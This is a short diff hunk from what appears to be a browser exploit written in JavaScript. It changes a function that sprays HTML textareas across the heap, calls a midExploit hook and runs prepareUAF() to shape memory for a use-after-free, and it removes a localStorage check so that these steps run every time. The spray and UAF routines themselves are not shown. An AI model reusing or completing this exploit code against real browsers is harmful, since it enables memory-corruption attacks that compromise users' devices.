@@ -443,15 +443,15 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-		if(localStorage.isCached){
-		/* Init spray */
-		sprayHTMLTextArea();
+							
+	/* Init spray */
+	sprayHTMLTextArea();
 
-		if(window.midExploit)
-			window.midExploit();
+	if(window.midExploit)
+		window.midExploit();
 
-		g_input = input1;
-		/* Shape heap layout for obj. reuse */
-		prepareUAF();
-	}
+	g_input = input1;
+	/* Shape heap layout for obj. reuse */
+	prepareUAF();
+  
 }
